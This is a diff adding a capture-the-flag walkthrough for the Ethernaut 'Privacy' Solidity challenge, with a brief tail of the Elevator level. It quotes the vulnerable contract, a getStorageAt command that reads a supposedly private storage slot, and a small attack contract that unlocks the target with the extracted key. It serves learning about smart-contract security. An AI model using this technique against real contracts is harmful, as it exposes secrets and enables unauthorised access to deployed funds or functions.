@@ -377,3 +377,53 @@ contract ElevatorAttack {
 we created our own implementation of the `isLastFloor()` method because the building references an instance of `Building(msg.sender)`, our `ElevatorAttack` contract can be that reference, meaning our own `isLastFloor()` method can be used to return whatever we want our method returned false and then true in order to fulfull this level's requirements
 
 
+
+
+
+# 12. [Challenge 12: Privacy](https://ethernaut.openzeppelin.com/level/0x11343d543778213221516D004ED82C45C3c8788B)
+
+Tasks:
+- The creator of this contract was careful enough to protect the sensitive areas of its storage. Unlock this contract to beat the level.
+
+Helpful Resources: 
+- [Walkthrough](https://www.goodbytes.be/blog/article/ethernaut-walkthrough-level-12-privacy)
+- [Storage In Solidity](https://docs.soliditylang.org/en/v0.8.10/internals/layout_in_storage.html)
+- [Read Ethereum Contract Storage](https://medium.com/aigang-network/how-to-read-ethereum-contract-storage-44252c8af925)
+
+**Solution:** \
+Vulnerable Code:
+```
+  bytes32[3] private data;
+
+  constructor(bytes32[3] memory _data) public {
+    data = _data;
+  }
+```
+
+Command to get the private data: 
+```
+await web3.eth.getStorageAt(contract.address, 5)
+```
+
+Attack Payload:
+```
+// SPDX-License-Identifier: MIT
+pragma solidity ^0.6.0;
+
+import './Privacy.sol';
+
+contract PrivacyAttack {
+    Privacy public privacy;
+
+    constructor(address _privacy) public { 
+        privacy = Privacy(_privacy);
+    }
+
+    function callUnlock(bytes32 _slotvalue) public {
+        bytes16 key = bytes16(_slotvalue);
+        privacy.unlock(key);
+    }
+}
+```
+Again, we are confronted with the fact that you can't keep any data private when it's stored on the public blockchain (unless of course, you encrypt it) once we understand storage slots, we can more easily grab any value from any contract that we want.
+
